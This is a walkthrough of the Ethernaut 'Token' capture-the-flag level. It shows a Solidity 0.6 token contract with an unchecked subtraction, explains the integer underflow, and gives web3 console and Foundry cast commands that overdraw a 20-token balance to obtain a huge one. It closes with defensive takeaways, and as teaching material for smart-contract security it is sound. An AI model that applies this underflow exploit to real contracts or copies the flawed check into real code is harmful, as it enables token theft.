**Level 05 - Token (Ethernaut)**
================================

**Overview**
------------

This level teaches about **integer underflow / overflow**.

The contract uses math without full protection.

We can use this to get more tokens.

**Objective:**

Get more tokens than you start with

## **Ethernaut Info**

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?

**Contract**
------------

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```


**Vulnerability**
-----------------

The problem is here:

```
require(balances[msg.sender] - _value >= 0);
```

This looks correct, but it is wrong.

-   Solidity version is **0.6**

-   No automatic overflow/underflow protection

If _value > balance:

-   subtraction underflows

-   result becomes a very large number


**Attack Strategy**
-------------------

We will:

1.  Send more tokens than we have

2.  Cause underflow

3.  Get a very large balance



**Exploit Steps**
-----------------

### **Method 1 --- Browser Console (Web3)**

#### **1\. Check balance**

```
await contract.balanceOf(player)
```


#### **2\. Transfer more than balance**

```
await contract.transfer("0x0000000000000000000000000000000000000000", 21)
```

(Example: if you have 20 tokens, send 21)


#### **3\. Check balance again**

```
await contract.balanceOf(player)
```

Now balance is very large.


### **Method 2 --- Foundry**

#### **1\. Check balance**

```
cast call $CONTRACT "balanceOf(address)(uint256)" $PLAYER
```


#### **2\. Trigger underflow**

```
cast send $CONTRACT "transfer(address,uint256)" 0x0000000000000000000000000000000000000000 21 --private-key $PRIVATE_KEY
```


#### **3\. Check balance**

```
cast call $CONTRACT "balanceOf(address)(uint256)" $PLAYER
```


**Why This Works**
------------------

In Solidity < 0.8:

-   No automatic checks for overflow/underflow

So:

```
0 - 1 = very large number
```

This breaks the logic.


**Key Takeaways**
-----------------

-   Old Solidity versions are dangerous

-   Always use SafeMath or Solidity ≥ 0.8

-   Never trust manual checks like this

-   Underflow can give unlimited tokens


**Tools**
---------

-   Browser console (web3)

-   Foundry (cast)

-   RPC provider


**Summary**
-----------

The contract has unsafe math.

We:

-   send more than balance

-   cause underflow

-   get huge balance
